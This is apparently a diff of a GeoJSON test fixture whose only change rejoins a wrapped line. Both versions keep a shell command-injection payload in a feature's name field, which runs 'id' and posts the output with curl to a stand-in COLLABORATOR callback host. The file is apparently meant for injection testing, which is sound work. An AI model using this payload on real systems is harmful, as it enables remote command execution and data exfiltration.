@@ -1,3 +1,2 @@
-{"type":"FeatureCollection","features":[{"type":"Feature","properties":{"name":"x'; id | curl --data-binary @-
-http://COLLABORATOR/id ; echo '"},"geometry":{"type":"Polygon","coordinates":[[[-50,60],[-50,61],[-49,61],[-49
+{"type":"FeatureCollection","features":[{"type":"Feature","properties":{"name":"x'; id | curl --data-binary @-http://COLLABORATOR/id ; echo '"},"geometry":{"type":"Polygon","coordinates":[[[-50,60],[-50,61],[-49,61],[-49
 ,60],[-50,60]]]}}]}
